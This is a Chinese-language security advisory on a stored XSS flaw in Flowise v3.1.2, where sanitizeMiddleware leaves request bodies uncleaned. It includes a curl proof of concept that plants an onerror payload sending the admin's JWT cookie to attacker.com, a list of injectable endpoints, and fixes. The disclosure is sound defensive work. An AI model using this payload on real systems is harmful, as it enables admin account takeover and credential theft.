# V-F003: Flowise sanitizeMiddleware 不过滤请求体导致 Stored XSS

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | Flowise（开源 LLM 流程编排平台）|
| 版本 | v3.1.2（截至 2026-04）|
| 类型 | CWE-79: 存储型跨站脚本（Stored XSS）|
| 严重程度 | 高危（High）|
| 攻击向量 | 网络（已认证，可升级为管理员账户接管）|
| 代码仓库 | https://github.com/flowiseai/flowise |

## 漏洞描述

Flowise 的 XSS 防护中间件 `sanitizeMiddleware` 仅对 URL 路径和查询参数进行清理，**完全跳过了 `req.body`（请求体）**。攻击者可通过 POST 请求将 XSS payload 存入数据库，当管理员在 UI 中浏览相关资源时，payload 在管理员浏览器中执行，可窃取 JWT Token 实现账户接管。

## 漏洞代码

**文件**：`packages/server/src/utils/XSS.ts`（完整文件）

```typescript
export function sanitizeMiddleware(req: Request, res: Response, next: NextFunction): void {
    // 只清理 URL
    const decodedURI = decodeURI(req.url)
    req.url = sanitizeHtml(decodedURI)

    // 只清理查询参数
    for (let p in req.query) {
        if (Array.isArray(req.query[p])) {
            const sanitizedQ = []
            for (const q of req.query[p] as string[]) {
                sanitizedQ.push(sanitizeHtml(q))
            }
            req.query[p] = sanitizedQ
        } else {
            req.query[p] = sanitizeHtml(req.query[p] as string)
        }
    }

    next()   // ⚠️ req.body 完全未处理，直接透传到控制器
}
```

`req.body` 中的用户输入直接被写入数据库，无任何 XSS 清理。

## 利用方式

### PoC：通过 Tools 接口存入 XSS payload

```bash
# 已认证用户（低权限账户即可）创建含 XSS 的 Tool
curl -X POST http://<target>:3000/api/v1/tools \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "<img src=x onerror=\"fetch('"'"'https://attacker.com/steal?c='"'"'+document.cookie)\">",
    "description": "test tool",
    "schema": "{}",
    "func": ""
  }'
```

管理员访问 Tools 管理页面时，浏览器执行 payload，将 JWT Cookie 发送至攻击者服务器：

```
GET https://attacker.com/steal?c=token=eyJhbGciOiJIUzI1NiJ9...
```

### 其他可注入点

以下接口均通过 `req.body` 接收用户输入，全部未经清理：

| 接口 | 注入字段 |
|------|--------|
| `POST /api/v1/tools` | `name`, `description`, `func` |
| `POST /api/v1/chatflows` | `name`, `flowData` |
| `POST /api/v1/variables` | `name`, `value` |
| `POST /api/v1/prompts` | `name`, `content` |
| `POST /api/v1/assistants` | `details` |

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `packages/server/src/utils/XSS.ts` | 5-21 | `sanitizeMiddleware` 跳过 `req.body` |

## 影响

1. **管理员账户接管**：窃取管理员 JWT Token，获得完整平台控制权
2. **后续 RCE 链**：接管管理员账户后，利用 V-F001（vm2 RCE）或直接操作凭据
3. **凭据泄露**：管理员访问凭据管理页面时，通过 DOM 读取窃取第三方 API Key

## 修复建议

1. **立即**：在 `sanitizeMiddleware` 中添加 `req.body` 的递归清理：
   ```typescript
   function sanitizeObject(obj: any): any {
       if (typeof obj === 'string') return sanitizeHtml(obj)
       if (Array.isArray(obj)) return obj.map(sanitizeObject)
       if (typeof obj === 'object' && obj !== null) {
           return Object.fromEntries(
               Object.entries(obj).map(([k, v]) => [k, sanitizeObject(v)])
           )
       }
       return obj
   }
   // 在 sanitizeMiddleware 中添加：
   if (req.body) req.body = sanitizeObject(req.body)
   ```
2. **短期**：添加 CSP 响应头：`Content-Security-Policy: script-src 'self'`，阻止内联脚本和外部脚本
3. **长期**：引入 `DOMPurify`（前端层）+ `sanitize-html`（后端层）双重防护

## 验证环境

- 源代码：Flowise v3.1.2（静态代码分析）
- 框架：Node.js + Express + sanitize-html
- 日期：2026-04-15
